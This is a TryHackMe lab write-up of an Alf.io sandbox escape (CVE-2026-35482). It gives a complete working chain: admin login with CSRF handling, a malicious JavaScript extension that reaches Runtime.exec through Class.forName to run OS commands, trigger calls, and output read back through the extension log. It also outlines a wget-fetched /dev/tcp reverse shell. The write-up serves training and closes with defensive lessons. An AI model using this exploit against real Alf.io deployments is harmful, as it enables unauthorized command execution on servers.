# NoScope: Finding RCE - Alf.io CVE-2026-35482 (TryHackMe)

- **Path:** Jr Penetration Tester > Vulnerability Knowledge
- **Completed:** 2026-10-11 - **Target:** <ip> (over VPN; solved live from own PC with
  Python requests driving the Alf.io admin API).
- **Creds given:** admin / `<redacted-pw>` at http://MACHINE_IP/admin
- **App:** Alf.io 2.0-M5-2509-1 (Java/Spring Boot event platform), vulnerable to CVE-2026-35482.

## Answer sheet

| Task | Question | Answer |
|---|---|---|
| 2 | Sandboxing engine in use | *(find it yourself)* |
| 2 | Flag from flag.txt | `THM{…}` |
| 3 | Event the exploit triggers on | *(find it yourself)* |

## The vulnerability (CVE-2026-35482)
Alf.io lets admins run custom JavaScript "extensions" on platform events. Scripts run in a
Mozilla Rhino sandbox and are checked against a blocklist (patterns like `java.lang.Runtime` and
reflection keywords are rejected). The flaw: Alf.io injects a variable `returnClass`, a raw Java
`Class<T>` object, into every script's scope. `Class<T>` exposes `Class.forName(String)`, so a
script can load ANY JVM class by passing its name as a STRING argument, which the blocklist never
inspects. From a loaded `Runtime` class, reflection reaches `Runtime.getRuntime().exec()` =
arbitrary OS command execution. Root cause: a blocklist on source text is not a sandbox; handing
untrusted code a live `Class` object hands it a class loader.

## Exploit chain (live, via the admin API)
No reverse shell was needed. Inbound back to our own VPN IP is unreliable, so the Extensions LOG
was used as the command-output channel instead (blind-RCE exfil through the app itself).

### 1. Authenticate (Spring Security form login + CSRF)
```
GET  /authentication-status           -> seeds XSRF-TOKEN cookie (and ALFIO_SESSION)
POST /authenticate                    -> body username=admin&password=<redacted-pw>
                                         header X-CSRF-TOKEN: <XSRF-TOKEN cookie value>
GET  /authentication-status           -> {"authenticated":true,"username":"admin",...}
```
CSRF: cookie `XSRF-TOKEN`, header `X-CSRF-TOKEN` (from the frontend bundle config). The token
rotates after login, so re-read it before each state-changing call.

### 2. Register the malicious extension
`POST /admin/api/extensions` with JSON `{path, name, script, enabled, async}`. The sandbox-escape
script (bound to EVENT_STATUS_CHANGE), reading output back through console.log -> extension log:
```javascript
function getScriptMetadata() {
  return { id:'rce-validate', displayName:'RCE Validate', version:0, async:false,
           events:['EVENT_STATUS_CHANGE'] };
}
function run(cmd) {
  var rtClass  = returnClass.forName('java.lang.Runtime');   // string arg dodges the blocklist
  var strClass = returnClass.forName('java.lang.String');
  var runtime  = rtClass.getMethod('getRuntime').invoke(null);
  var proc     = rtClass.getMethod('exec', strClass).invoke(runtime, cmd);
  var bytes    = proc.getInputStream().readAllBytes();
  var out=''; for (var i=0;i<bytes.length;i++) out+=String.fromCharCode(bytes[i]&0xFF);
  return out;
}
function executeScript(scriptEvent) {
  console.log('FLAG>>> ' + run('cat /etc/flag.txt') + ' <<<');
  return true;   // EVENT_STATUS_CHANGE expects a boolean return (object return -> gson error)
}
```
Note: `Runtime.exec(String)` does NOT invoke a shell, so no pipes/redirection/metacharacters.
Each command is one argv-tokenised program: `cat /etc/flag.txt` and `find / -name flag.txt` work;
anything needing a shell must use `exec(String[])` with `sh -c`.

### 3. Trigger and read
```
PUT /admin/api/events/1/status?active=true    # publish (DRAFT->PUBLIC) fires EVENT_STATUS_CHANGE
PUT /admin/api/events/1/status?active=false   # hide, fires it again (re-trigger)
GET /admin/api/extensions/log?page=0          # {"left":[{...description...}],"right":N}
```
Recon payload (`id` + `find`) showed: running as `uid=1001(alfio)`, flag at `/etc/flag.txt`.
Final payload logged: `FLAG>>> THM{…} <<<`.

## Gotchas hit
- Status-change endpoint takes a request PARAM `?active=true|false` (boolean), NOT a JSON body, and
  the event id must be the numeric id (1), not the shortName (`tryhackme`).
- Two extensions at the same `path` -> only the first runs. To change behaviour, OVERWRITE the
  existing one: `POST /admin/api/extensions/{path}/{name}` (here `/admin/api/extensions/-/rce`).
  PUT on the collection is 405; delete is `DELETE /admin/api/extensions/{path}/{name}`.
- EVENT_STATUS_CHANGE handler must `return` a boolean; returning an object throws a gson
  "Expected a boolean" error (the console.log still fires first, so output is not lost).
- Reverse-shell route (per the room): serve a `/dev/tcp` bash one-liner over HTTP, `wget` it with
  the RCE, chmod, and run it to a netcat listener. Omitted here (not needed; also needs inbound
  reachability, which our own-PC VPN does not reliably allow - use the AttackBox for that path).

## Lessons learned
- A language sandbox that validates source text against a blocklist is defeated by indirection:
  never expose a live reflective object (`Class`, `ClassLoader`, `Method`) to sandboxed code.
  `Class.forName(string)` turns a string denylist into nothing.
- Blind RCE does not require an outbound shell: find an in-app readback channel (here the extension
  log) and exfil command output through it. Great when inbound is firewalled.
- Drive a Spring Security SPA purely over HTTP: seed CSRF from a public GET, POST /authenticate
  with the X-CSRF-TOKEN header, reuse the session cookie, and re-read the rotating token.
- NoScope framing: the room's point is that AI agents find and validate these chains autonomously;
  the manual method here is the same enumerate -> escape -> trigger -> read loop.
